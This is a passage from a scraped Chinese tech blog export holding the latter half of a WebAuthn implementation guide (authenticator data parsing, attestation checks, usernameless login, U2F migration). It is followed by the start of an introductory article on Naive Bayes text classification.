<code>attestedCredentialData</code>，而验证时不包含</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>保留位</li>\n<li>\n<code>UV</code>：用户是否已验证</li>\n<li>保留位</li>\n<li>\n<code>UP</code>：用户是否在场</li>\n</ul>\n</li>\n<li>\n<code>signCount</code>：签名计数，长度 4 字节</li>\n<li>\n<code>attestedCredentialData</code>：包含公钥等凭据数据，变长。其结构如下：\n<ul>\n<li>\n<code>aaguid</code>：认证器的 AAGUID (Authenticator Attestation GUID)，对于同一型号的认证器，它们的 AAGUID 是相同的</li>\n<li>\n<code>credentialIdLength</code>：标识 <code>credentialId</code> 的长度，长度 2 字节</li>\n<li>\n<code>credentialId</code>：凭证 ID，和 <code>rawId</code> 一致，长度由 <code>credentialIdLength</code> 定义</li>\n<li>\n<code>credentialPublicKey</code>：CBOR 编码的 COSE 格式的凭证公钥，变长</li>\n</ul>\n</li>\n<li>\n<code>extensions</code>：扩展数据，变长，本文不讨论</li>\n</ul>\n<blockquote><p>出于隐私考虑，如果不要求证明，认证器会以 0 填充 AAGUID。</p></blockquote>\n<p>如果你的后端在使用 Node.js，这里有个工具函数可以帮你完成这一步（不考虑 <code>extensions</code>）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function parseAuthData(buffer){\r\n    let rpIdHash = buffer.slice(0, 32);\r\n    buffer = buffer.slice(32);\r\n  \r\n    let flagsBuf = buffer.slice(0, 1);\r\n    buffer = buffer.slice(1);\r\n\r\n    let flagsInt = flagsBuf[0];\r\n    let flags = {\r\n        up: !!(flagsInt &amp; 0x01),\r\n        uv: !!(flagsInt &amp; 0x04),\r\n        at: !!(flagsInt &amp; 0x40),\r\n        ed: !!(flagsInt &amp; 0x80),\r\n        flagsInt\r\n    }\r\n\r\n    let counterBuf = buffer.slice(0, 4);\r\n    buffer = buffer.slice(4);\r\n  \r\n    let counter = counterBuf.readUInt32BE(0);\r\n\r\n    let aaguid = undefined;\r\n    let credID = undefined;\r\n    let COSEPublicKey = undefined;\r\n\r\n    if(flags.at) {\r\n        aaguid = buffer.slice(0, 16);\r\n        buffer = buffer.slice(16);\r\n\r\n        let credIDLenBuf = buffer.slice(0, 2);\r\n        buffer = buffer.slice(2);\r\n\r\n        let credIDLen = credIDLenBuf.readUInt16BE(0);\r\n        credID = buffer.slice(0, credIDLen);\r\n\r\n        buffer = buffer.slice(credIDLen);\r\n        COSEPublicKey = buffer;\r\n    }\r\n\r\n    return {rpIdHash, flagsBuf, flags, counter, counterBuf, aaguid, credID, COSEPublicKey}\r\n}</pre>\n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>解开后，依赖方至少需要做四件事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>存储签名计数</li>\n<li>存储公钥</li>\n</ol>\n<blockquote><p>签名计数不一定从 0 开始。</p></blockquote>\n<p>对于公钥，也就是 <code>credentialPublicKey</code>，我们需要多一次 CBOR 解码，然后就可以得到类似这样的公钥：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    kty: \"EC\",\r\n    alg: \"ECDSA_w_SHA256\",\r\n    crv: \"P-256\",\r\n    x: \"ZGQALNfqo0L7HFYQHFHCS/X5db49z0ePnuQEs3w3X8w=\",\r\n    y: \"6qYxhnjYuez/Q8N6vX7nIIGfxFWdZ25NzQfZYuYOalA=\"\r\n}</pre>\n<p>然后可以选择适当的方法将其存储起来，之后的步骤本文就不再赘述了。现在，将目光拉回来，让我们看看包含证明的 <code>attestationObject</code> 是怎么样的。我们来看一个例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    fmt: \"packed\",\r\n    attStmt: {\r\n        alg: -7,\r\n        sig: [48, 70, 2, 33, 0, ..., 132, 78, 46, 100, 21],\r\n        x5c: [\r\n            [48, 130, 2, 189, 48, 130, 1, 165, 160, 3, ..., 177, 48, 125, 191, 145, 24, 225, 169, 41, 248]\r\n        ]\r\n    },\r\n    authData: [211, 217, 43, 24, 199, ..., 158, 54, 87, 126, 54]\r\n}</pre>\n<p>这里有一个使用 \"packed\" 格式的证明。此时，<code>attStmt</code> 中包含三个值：</p>\n<ul>\n<li>\n<code>alg</code>：签名算法</li>\n<li>\n<code>sig</code>：签名值</li>\n<li>\n<code>x5c</code>：X.509 编码的证书链</li>\n</ul>\n<p>我们不会在这一节中详述对签名的验证。要了解更多信息，你可以阅读“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。现在，让我们来看看如何处理验证过程中认证器发回的数据。我们得到的数据应该是这样的（数据较长，已省略一部分）：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    id: \"hmqdxPLit9...BWeVxZqdvU\",\r\n    type: \"public-key\",\r\n    rawId: \"hmqdxPLit9V...BWeVxZqdvU=\",\r\n    response: {\r\n        authenticatorData: \"09krGMcWTf...UFAAAABA==\",\r\n        clientDataJSON: \"eyJjaGFsbGVuZ2U...XRobi5nZXQifQ==\",\r\n        signature: \"UsXZV3pvT3np8btj6V0g...WBkaqyt88DrD40qh+A==\",\r\n        userHandle: \"MmYxNWYzZjQyZjM...Tg2ZDY4NzhlNw==\"\r\n    }\r\n}</pre>\n<p><code>id</code>, <code>rawId</code> 和 <code>type</code> 和之前一样，这里就不再赘述了。让我们来看看 <code>response</code>。首先是 <code>clientDataJSON</code>，和之前的解法一样，要验证的内容也一样，只是 <code>type</code> 从 \"webauthn.create\" 变成了 \"webauthn.get\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    challenge: \"bnkd2CmrEuvKnAFXs2QlC3SKlg4XFvGtP4HJL1yEWyU\",\r\n    origin: \"https://dev.axton.cc\",\r\n    type: \"webauthn.get\"\r\n}</pre>\n<p>然后是 <code>userHandle</code>。前面讲过，这是认证器在创建凭证时的用户 ID。如果用户在使用 U2F 认证器，很可能这一项为空，所以大部分情况下我们不关心这一项。</p>\n<p>接着来看 <code>authenticatorData</code>。这其实就是之前的 <code>attestedCredentialData</code>，只是这次不包含公钥。以相同的方式切开数据，我们应该可以得到 <code>rpIdHash</code>, <code>flags</code>和 <code>signCount</code> 三项。此时，依赖方至少需要做这三样事情：</p>\n<ol>\n<li>验证 <code>rpIdHash</code> 和预期的一致</li>\n<li>按预期检查用户在场和用户验证状态</li>\n<li>验证签名计数大于之前存储的计数，并更新存储的计数</li>\n</ol>\n<blockquote><p>如果签名计数比之前的小，那么这个认证器很可能是伪造的，应该中止验证并返回验证失败。同时，签名计数不一定每次按 1 递增，通常只要计数比此前的大就认为计数检查通过。</p></blockquote>\n<p>最后，我们来看 <code>signature</code>，也就是签名。不过这个签名不是简单的对挑战的签名，具体算法如图所示：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/s3-2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"签名过程\" width=\"1034\" height=\"587\" class=\"aligncenter size-full wp-image-2231\"></a>\n<p>计算签名时，认证器会将 <code>authenticatorData</code> 与 <code>clientDataHash</code>（也就是 <code>clientDataJSON</code> 的 SHA-256 Hash）拼接起来，并使用对应的私钥签名。依赖方应该使用对应的公钥将其解密，并验证内容是否是 <code>authenticatorData</code> 与 <code>clientDataHash</code> 的拼接。这部分的计算不在本文的讨论范围内。</p>\n<p>最后，如果全部验证通过，返回验证成功。<span></span></p>\n<h2>验证认证器</h2>\n<p>WebAuthn 已经很安全了，但有的时候我们还要让它更安全一点。比如，如果用户在使用伪造的或是自制的认证器，认证器的安全性就得不到保证。此时，依赖方就需要验证认证器是否是可信的认证器。</p>\n<blockquote><p>这一过程仅发生在注册认证器时。此时，如果认证器验证通过，就可以存储公钥，后续步骤和之前描述的一致。</p></blockquote>\n<blockquote><p>再次说明，如果不是对安全性有极高的要求，向认证器索取证明以验证认证器是否可信是没有必要的。此外，验证认证器需要依赖方自行维护可信认证器列表，大大增加了维护的复杂性。</p></blockquote>\n<p>在调用 <code>navigator.credentials.create()</code> 时，我们可以将 <code>attestation</code> 设置为非 \"none\" 来向认证器索取证明。除无证明外，WebAuthn 定义了四种证明方式：</p>\n<ul>\n<li>Basic Attestation (Basic) ：基础的证明方式，认证器会使用认证器私钥签名</li>\n<li>Self Attestation (Self) ：自证明，认证器会使用凭证私钥签名</li>\n<li>Attestation CA (AttCA) ：认证器会使用多个证明私钥之一签名</li>\n<li>Elliptic Curve based Direct Anonymous Attestation (ECDAA) ：通过 <a href=\"https://en.wikipedia.org/wiki/Direct_Anonymous_Attestation\">DAA</a> 实现的匿名证明</li>\n</ul>\n<blockquote><p>和验证过程一样，这里签名的目标是 <code>authenticatorData</code> 和 <code>clientDataHash</code> 的连接。</p></blockquote>\n<p>还记得 <code>create()</code> 时 <code>attestation</code> 可选的三个值吗？这个值会决定认证器最终使用哪种方式进行证明。复习一下：</p>\n<ul>\n<li>\n<code>none</code>：大部分情况下认证器会选择不进行证明，部分认证器会进行自证明。此时 AAGUID 会被 0 填充</li>\n<li>\n<code>indirect</code>：认证器会试图通过替换 AAGUID 和选择合适的证明方式来进行匿名证明，具体方式由认证器选择</li>\n<li>\n<code>direct</code>：认证器会提供最直接的证明信息</li>\n</ul>\n<p>注意，大部分情况下，当认证器需要向依赖方证明自己可信时需要提供认证器公钥，<strong>这会触发浏览器提示，只有用户同意后认证器才会进行证明，否则认证器将不提供证明。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/5.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"446\" height=\"283\" class=\"aligncenter size-full wp-image-2217\"></a>\n<blockquote><p>为什么浏览器会说“安全密钥的品牌和型号”？事实上，为了避免用户通过认证器证书被跨依赖方追踪，FIDO 要求使用相同认证器证书的认证器的数量不能少于 100,000。于是大部分认证器厂商会选择<strong>让同一型号的认证器共用同一份证书。</strong>因此，浏览器的会询问用户是否同意“查看安全密钥的品牌和型号”。</p></blockquote>\n<blockquote><p>Android Safety Net 不会向用户询问是否同意，而是会静默进行证明。</p></blockquote>\n<p>当证明不为空时，依赖方收到数据后根据 <code>attestationObject.fmt</code> 的不同，需要选择不同的验证方式来验证认证器的可信情况。出于篇幅原因，这里我们不会讨论每一种 <code>fmt</code> 的验证方式，更多信息你可以查阅 <a href=\"https://www.w3.org/TR/webauthn/#defined-attestation-formats\">W3C 文档</a>。</p>\n<p>当 <code>fmt</code> 为 <code>packed</code> 时，<code>attestationObject.attStmt</code> 可能会有三种格式：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">// 自证明\r\n{\r\n    alg, // 算法\r\n    sig // 签名\r\n}\r\n// 基础或证明 CA 证明\r\n{\r\n    alg,\r\n    sig,\r\n    x5c // X.509 证书链\r\n}\r\n// 椭圆曲线证明\r\n{\r\n    alg,\r\n    sig,\r\n    ecdaaKeyId // ECDAA-Issuer 公钥标识符\r\n}</pre>\n<p>此时，依赖方需要检查证书符合预期格式并检查证书是否在可信链上。首先，如果证明中既没有 <code>ecdaaKeyId</code> 也没有 <code>x5c</code>，就说明这个证明使用的是自证明，只需使用认证器提供的公钥验证即可；如果有 <code>x5c</code>，那么就需要验证 <code>x5c</code> 中的证书是否在可信链上。将 <code>x5c</code> 中的每个证书以 Base64 编码，按 64 个字符切开，并在头尾加上 <code>-----BEGIN CERTIFICATE-----</code> 和 <code>-----END CERTIFICATE-----</code>就能得到一个证书字符串了。之后，依赖方需要验证证书是否可信。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function base64ToPem(b64cert){\r\n    let pemcert = '';\r\n    for(let i = 0; i \n<p>这段代码来自 <a href=\"https://gist.github.com/herrjemand/dbeb2c2b76362052e5268224660b6fbc\">herrjemand</a></p>\n<p>至于 <code>ecdaaKeyId</code>，由于目前应用较少，处理方法可能需要你另寻资料了。检查证书的具体步骤已经超出了本文的范围，具体可以查阅<a href=\"https://medium.com/@herrjemand/verifying-fido2-packed-attestation-a067a9b2facd\">这篇文章</a>（英文）。</p>\n<blockquote><p>你可以在 <a href=\"https://fidoalliance.org/metadata/\">FIDO Metadata Service</a> 找到各大厂商认证器的可信证书链。</p></blockquote>\n<p>当在 Android 上调起 WebAuthn 时，大部分情况下 <code>fmt</code> 将会为 <code>safety-net</code>。此时 <code>attestationObject.attStmt</code> 的结构会是：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    ver: \"200616037\",\r\n    response: {\r\n        type: \"Buffer\",\r\n        data: [101, 121, 74, 104, 98, ..., 115, 104, 104, 82, 65]\r\n    }\r\n}</pre>\n<p>此时，<code>clientDataJSON</code> 中还会出现 <code>androidPackageName</code> 键，值是调起 WebAuthn 验证的应用的包名，如 Chrome 就是 \"com.android.chrome\"。</p>\n<p>在这个证明中，<code>data</code> 其实是一个 JWT 字符串，我们可以将它编码为字符串并将其按照 JWT 进行解码（别忘了验证 JWT 签名）。最终我们会得到一个类似这样的 Payload：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    nonce: \"0QAurN4F9wik6GEkblDJhGuf4kuaqZn5zaaxlvD1hlA=\",\r\n    timestampMs: 1584950686460,\r\n    apkPackageName: \"com.google.android.gms\",\r\n    apkDigestSha256: \"2BQHno+bmWWwdLUYylS8HLt5ESJzci3nt2uui71ojyE=\",\r\n    ctsProfileMatch: true,\r\n    apkCertificateDigestSha256: [\r\n        \"8P1sW0EPicslw7UzRsiXL64w+O50Ed+RBICtay2g24M=\"\r\n    ],\r\n    basicIntegrity: true,\r\n    evaluationType: \"BASIC\"\r\n}</pre>\n<p>其中包含了有关设备状态的一些信息。比如说，如果 <code>ctsProfileMatch</code> 为 <code>false</code>，那么该设备很有可能被 root 了。对于高安全要求的场景，我们可以视情况进行验证。</p>\n<p>同时我们可以在 JWT Header 中验证证明的有效性。我们应该能取得这样的 Header：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">{\r\n    alg: \"RS256\",\r\n    x5c: [\r\n        \"MIIFkzCCBHugAwIBAgIR...uvlyjOwAzXuMu7M+PWRc\",\r\n        \"MIIESjCCAzKgAwIBAgIN...UK4v4ZUN80atnZz1yg==\"\r\n    ]\r\n}</pre>\n<p>这里的结构就和上方的 <code>x5c</code> 验证类似了。具体步骤可以参考<a href=\"https://medium.com/@herrjemand/verifying-fido2-safetynet-attestation-bd261ce1978d\">这篇文章</a>（英文）。</p>\n<p>其他所有格式的验证方式也都可以在<a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">这篇文章</a>（英文）中找到。<span></span></p>\n<h2>无用户名登录</h2>\n<p>认证器已经代替了密码，可是这还不够！在进行第一因素认证（即使用 WebAuthn 登录）时，我们还是需要输入用户名，然后才能进行身份认证。懒惰是第一生产力，我们能不能不输入用户名就进行身份认证呢？实际上，大部分认证器都允许我们无用户名登录。<strong>而这一特性的核心就是 Resident Key 客户端密钥驻留。</strong></p>\n<p>你可以思考一下，为什么普通的 WebAuthn 为什么不能实现无用户名登录？事实上，大部分认证器为了实现无限对公私钥，会将私钥通过 Key Warp 等技术加密后包含在凭证 ID 中发送给依赖方，这样认证器本身就不用存储任何信息。不过，这就导致需要身份认证时，依赖方必须通过用户名找到对应的凭证 ID，将其发送给认证器以供其算出私钥。</p>\n<blockquote><p>Yubikey 实现了一个基于 HMAC 的算法，认证器可以在私钥不离开认证器的前提下（常规的 Key Warp 算法中实际上私钥离开了认证器）通过一些输入和凭证 ID 重新计算私钥，你可以阅读<a href=\"https://www.yubico.com/blog/yubicos-u2f-key-wrapping/\">这篇文章</a>了解更多。</p></blockquote>\n<blockquote><p>客户端通过凭证 ID 查找对应认证器的算法根据系统的不同是不同的。通常凭证 ID 中会包含认证器信息，因此系统可以通过凭证 ID 找到对应的认证器。</p></blockquote>\n<p>要避免输入用户名，我们可以要求认证器将私钥在自己的内存中也存储一份。这样，依赖方无需提供凭证 ID，认证器就可以通过依赖方 ID 找到所需的私钥并签名公钥。以下是具体流程：</p>\n<p>注册时：</p>\n<ol>\n<li>依赖方请求新建凭证，同时要求启用客户端密钥</li>\n<li>认证器生成一对公私钥，并将私钥存储在永久内存中且与依赖方 ID 及用户 ID 绑定，随后将公钥发送给依赖方以供存储</li>\n<li>依赖方将用户 ID 即公钥与用户绑定</li>\n</ol><p>验证时：</p>\n<ol>\n<li>依赖方请求验证，但不必提供除依赖方 ID 以外的更多信息</li>\n<li>用户选择认证器</li>\n<li>认证器根据依赖方 ID 找到对应私钥</li>\n<li>如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录</li>\n<li>确定私钥后，认证器签名挑战并将其返回，同时返回用户 ID</li>\n<li>依赖方通过用户 ID 找到对应用户并用对应公钥检查签名，正确则允许对应用户登录</li>\n</ol><blockquote><p>可以看到，这个特性同时要求认证器存储用户 ID，即上面提到过的 <code>userHandle</code>。依赖方需要根据此信息找到对应用户，因此不支持 <code>userHandle</code> 的 U2F 认证器无法进行无用户名登录。</p></blockquote>\n<blockquote><p>如之前所说，<strong>认证器能永久存储的私钥数量是有限的</strong>，因此只应在真正需要无用户名登录的时候启用此特性。</p></blockquote>\n<blockquote><p>目前暂时没有办法检测认证器是否支持客户端密钥驻留，因此在无用户名验证失败时应 fallback 至常规的 WebAuthn 验证，即向用户询问用户名。</p></blockquote>\n<p>现在让我们来看看如何实现这一特性吧。首先，调用 <code>navigator.credentials.create()</code> 时我们需要注意两个参数：<code>requireResidentKey</code> 必须为 <code>true</code>，<code>userVerification</code> 必须为 \"required\"。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"5-6\">navigator.credentials.create({\r\n    publicKey: {\r\n        ...\r\n        authenticatorSelection: {\r\n            requireResidentKey: true,\r\n            userVerification: \"required\"\r\n            ...\r\n        },\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Windows Hello <strong>似乎</strong>会存储所有已注册的凭据，因此无论是否指定 <code>requireResidentKey</code>，你都可以通过 Windows Hello 进行无用户名登录。</p></blockquote>\n<p>随后，浏览器会询问用户是否允许认证器存储私钥。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/3.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"浏览器提示\" width=\"445\" height=\"285\" class=\"aligncenter size-full wp-image-2208\"></a>\n<p>如果用户同意，认证器会存储私钥，并和普通的 WebAuthn 一样返回信息。不过，依赖方收到数据之后，只需将公钥、用户 ID 与用户关联起来，而不必再将凭证 ID 与用户关联起来。至此注册完成。</p>\n<p>之后，在用户请求登录时，无需再向依赖方提供用户名。同时在传入 <code>navigator.credentials.get()</code> 的参数中也有两个需要注意：<code>userVerification</code> 必须为 \"required\"，同时 <code>allowCredentials</code> 必须为空。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\" data-enlighter-highlight=\"4-5\">navigator.credentials.get({\r\n    publicKey: {\r\n        ...\r\n        userVerification: \"required\",\r\n        allowCredentials: [],\r\n        ...\r\n    }\r\n})</pre>\n<blockquote><p>Android 暂不支持无用户名验证，空的 <code>allowCredentials</code> 会导致浏览器返回 <code>NotSupportedError</code> 错误。</p></blockquote>\n<p>此时，认证器会根据依赖方 ID 找到对应的私钥。如果有多个对应私钥，认证器会询问用户应该使用哪个身份信息登录。用户选择后，认证器就会使用对应的私钥签名挑战并将其返回。此时，<code>userHandle</code> 一定不为空。</p>\n<p>依赖方收到数据后，需要将 <code>userHandle</code> 作为用户 ID 找到对应的用户，并使用对应的公钥验证签名。如果验证成功，则认为对应的用户身份认证成功，依赖方可以允许其登录。至此验证结束。</p>\n<blockquote><p>有的时候你可能会需要清除认证器中的密钥。绝大多数认证器都提供了对应的软件以供清除存储的密钥，但大部分情况下这会重置整个认证器，这意味着相关认证器此前的所有凭证均会失效。因此建议不要将日常使用的认证器作为开发测试用的认证器。</p></blockquote>\n<h2>从 U2F 认证迁移</h2>\n<p>如果你的服务此前提供了 U2F 第二因素认证，你可能会希望在将依赖方从 U2F 升级到 WebAuthn 时用户此前注册的 U2F 认证器仍然可用而无需重新注册。由于 WebAuthn 向后兼容 U2F 设备，用户是可以继续使用原有的 U2F 认证器的。不过，由于 WebAuthn 的依赖方 ID 与 U2F 的 <code>appid</code> 并不一定相同，你需要将原有的 U2F <code>appid</code> 随 WebAuthn 流程一起传递给认证器，认证器才能使用正确的私钥进行响应。</p>\n<p>要实现这一点，我们只需要在注册及认证仪式中使用 WebAuthn 的 <code>appid</code> 扩展。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">extensions: {\r\n    appid: \"https://example.com\" //U2F appid\r\n}</pre>\n<p>此时认证器便可以得到正确的私钥，之后的流程与正常情况一致；依赖方除了正常的 WebAuthn 流程外，不需要再做任何其它操作。</p>\n<h2>拓展阅读</h2>\n<p>我们的 WebAuthn 之旅到这里就真的结束了。不过，你仍然可以自行探究，了解更多。<strong>本文只是一个粗浅的使用指南</strong>，而被称为“Web 身份认证的未来”的 WebAuthn 的深层还要很多细节值得我们挖掘学习，不过本文不会再继续讨论了。</p>\n<p>如果你想了解更多关于 WebAuthn 的信息，最好的方法是直接阅读 <a href=\"https://www.w3.org/TR/webauthn\">W3C 规范</a>。此外，Yubico 也提供了不错的 <a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn 文档</a>。</p>\n<p>要了解更多认证器存储凭证的信息，你可以阅读<a href=\"https://duo.com/labs/tech-notes/how-security-keys-store-credentials\">这篇文章</a>（英文）。</p>\n<p>如果你想了解更多 Android Safety Net 是怎样运作的，可以观看<a href=\"https://youtu.be/8lv_9mydrjg\">这个视频</a>，并通过 <a href=\"https://developer.android.com/training/safetynet/attestation\">Google 的文档</a>了解 Android Safety Net 的更多信息。</p>\n<p>如果你想方便地调试 WebAuthn，<a href=\"https://webauthn.me/\">webauthn.me</a> 提供了一个非常直观方便的<a href=\"https://webauthn.me/debugger\">调试器</a>。</p>\n<h1>参考资料</h1>\n<p><a href=\"https://www.w3.org/TR/webauthn\">WebAuthn Level 1 规范 - W3C</a><br><a href=\"https://github.com/w3c/webauthn\">WebAuthn Level 2 草案 - W3C</a><br><a href=\"https://blog.techbridge.cc/2019/08/17/webauthn-intro/\">一起来了解Web Authentication - TechBridge 技术共笔部落格</a><br><a href=\"https://medium.com/@herrjemand/introduction-to-webauthn-api-5fd1fb46c285\">Introduction to WebAuthn API - Medium</a><br><a href=\"https://medium.com/@herrjemand/verifying-fido2-responses-4691288c8770\">WebAuthn/FIDO2: Verifying responses - Medium</a><br><a href=\"https://obeta.me/posts/2019-03-01/WebAuthn%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BD%BF%E7%94%A8\">WebAuthn介绍与使用 - obeta</a><br><a href=\"https://webauthn.io/\">webauthn.io</a><br><a href=\"https://webauthn.guide/\">webauthn.guide</a><br><a href=\"https://webauthn.me/\">webauthn.me</a><br><a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion\">Attestation and Assertion - MDN</a><br><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Authentication_API\">Web Authentication API - MDN</a>（顺便翻译了一半）<br><a href=\"https://fidoalliance.org/fido-technotes-the-truth-about-attestation/\">FIDO TechNotes: The Truth about Attestation - FIDO Alliance</a><br><a href=\"https://developers.yubico.com/WebAuthn/WebAuthn_Developer_Guide/\">WebAuthn Developer Guide - Yubico</a><br><a href=\"https://en.wikipedia.org/wiki/WebAuthn\">WebAuthn - Wikipedia</a><br><a href=\"https://techcommunity.microsoft.com/t5/identity-standards-blog/all-about-fido2-ctap2-and-webauthn/ba-p/288910\">All about FIDO2, CTAP2 and WebAuthn - Microsoft Tech Community</a><br><a href=\"https://webauthn-doc.spomky-labs.com/\">Webauthn Framework</a><br><a href=\"https://zhuanlan.zhihu.com/p/25279015\">如何开发支持 FIDO U2F 登录的网站 - 知乎专栏</a><br></p></pre>\n","link":"https://flyhigher.top/develop/2160.html"},{"title":"NLP 找门：用朴素贝叶斯进行文本分类","date":"2020-01-29 11:39:58","description":"\n<blockquote>\n<p>有一天，神收到了一封垃圾邮件，于是世界上就有了朴素贝叶斯算法。</p>\n<footer>——我瞎编的</footer>\n</blockquote>\n<p>为什么这篇文章的标题是 NLP 找门呢？因为如果你看完了这篇文章，你就可以<strong>准备入门</strong>自然语言处理 (<strong>N</strong>atural <strong>L</strong>anguage <strong>P</strong>rocessing) 了。我会把这篇文章当作一篇彻彻底底的 NLP 入门文章来写，尽量避免“专业高端”词汇和“全是奇怪符号”的式子，这样<strong>只要你有高中数学基础</strong>，就能毫无压力地看完这篇文章，学会使用朴素贝叶斯分类算法分类文本。</p>\n<p>让我们开始吧。</p>\n<h1>所以，啥是朴素贝叶斯？</h1>\n<p>简单来说，朴素贝叶斯 (Naïve Bayes) <strong>是一个简单但高效的分类算法</strong>，在进行不复杂的文本分类时高效且拥有不低的准确度，判断垃圾邮件就是用朴素贝叶斯进行文本分类的一个经典例子。当然朴素贝叶斯分类不仅能用在 NLP 中，在许多分类问题中朴素贝叶斯也有非常好的效果，但我们今天只关注它在 NLP 中的应用。</p>\n<p>要了解朴素贝叶斯，我们要先来了解一下贝叶斯定理。</p>\n<blockquote>\n<p>每增加一个数学公式都会使读者减半。</p>\n<footer>——霍金</footer>\n</blockquote>\n<p>那么，就让我们先来看看贝叶斯定理的公式吧（笑</p>\n<p>$$P(A|B) = \\frac{P(AB)}{P(B)} = \\frac{P(B|A)P(A)}{P(B)}$$</p>\n<p>其实还是很简单的，运用高中的条件概率知识就能理解。本质上，贝叶斯定理给出了一种方法，使得我们可以在 \\(P(A|B)\\) 和 \\(P(B|A)\\) 之间互相转换，因为通常情况下它们是不一样的。</p>\n<p>要更好地理解，请考虑这样一个例子：</p>\n<blockquote><p>假设有一个学校图书馆，图书管理员正为找不到某本书而发愁。已知老师有 70% 的意愿借走这本书，而是学生的意愿是 30%，这个学校的师生比例是 1:10，那么借走这本书的人是老师的概率有多大？</p></blockquote>\n<p>设学校总人数为 \\(T\\)，我们可以很容易地写出这样的一个式子：</p>\n<p>$$\\begin{align} P &amp; = \\frac{T\\cdot\\frac{1}{11}\\cdot 70\\%}{T\\cdot\\frac{1}{11}\\cdot 70\\%+T\\cdot\\frac{10}{11}\\cdot 30\\%} \\\\ &amp; = \\frac{70\\%}{70\\%+10\\times30\\%} \\\\ &amp; = \\frac{7}{37} \\end{align}$$</p>\n<p>这就是贝叶斯定理了！等等，你可能会挠挠头，这哪里是贝叶斯了？别急，如果我们把最上面的式子换个字母的话…</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>在这里，\\(H\\) 指 Hypothesis，即假设，而 \\(E\\) 指 Evidence，即证据。这样，这个式子就很好理解了，在我们上面的例子里，借走书是证据，那么 \\(P(E)\\) 就是某个人选择借走这本书的概率；这个人是老师是假设，那么这个人是老师的概率是 \\(P(H)\\)。<strong>注意这里的概率指在学校中抽一个人是老师的概率，并不是“在借走书的前提下”这个人是老师的概率</strong>，而“在借走书的前提下”这个人是老师的概率应该是 \\(P(H|E)\\)，也正是我们要求的概率。同样地，而“这个人是老师”的前提下借走书的概率就是 \\(P(E|H)\\) 了。</p>\n<p>那么再来看看上面我们凭小学知识就列出的计算式，如果把里面的具体数据换成概率来表示的话，这个式子就会变成…</p>\n<p>$$P(H|E) = \\frac{T\\cdot P(E|H)P(H)}{T\\cdot P(E|H)P(H) + T\\cdot P(E|\\neg H)P(\\neg H)}$$</p>\n<p>好吧，这里解释一下，\\(\\neg\\) 符号表示“非”，所以 \\(P(E|\\neg H)\\) 表示在“这个人不是老师”的前提下借走书的概率。而 \\(T\\cdot P(E|H)P(H)\\) + \\(T\\cdot P(E|\\neg H)P(\\neg H)\\)，即“可能借走书的老师的数量 + 可能借走书的学生的数量”，就是“可能借走书的人的数量”了，也就是 \\(T\\cdot P(E)\\)。上下消去 \\(T\\)，我们就能得到上面的式子了。</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)}$$</p>\n<p>这就是贝叶斯了定理。如果你还是不太清楚，可以去看看 3Blue1Brown 的<a href=\"https://www.bilibili.com/video/av84799361\">这个视频</a>，图形化的讲解会清晰很多。</p>\n<p>这里我要提一下这个式子里各部分的专有名称了（“专业高端”词汇警告），你可以不记住，直接看后面。</p>\n<ul>\n<li>\\(P(H|E)\\) 叫做 \\(H\\) 的<strong>后验概率</strong>，反之亦然</li>\n<li>\\(P(H)\\) 叫做 \\(H\\) 的<strong>先验概率</strong>，反之亦然</li>\n<li>特别地，我们把 \\(P(E|H)\\) 称作<strong>“似然值”</strong>，即 likelihood</li>\n</ul>\n<p>那什么是朴素贝叶斯呢？按上面所说的，朴素贝叶斯是一种分类算法。简单来说，朴素贝叶斯将一个对象的各个特征考虑为互相独立，然后根据这些特征的概率的乘积来判断对象所属的分类。基本原理如下：</p>\n<p>$$P(H|E) = \\frac{P(E|H)P(H)}{P(E)} \\propto P(E|H)P(H) = P(H)\\prod_{i}P(W_i|H)$$</p>\n<p>在这里，\\(W_i\\) 指某一对象的第 \\(i\\) 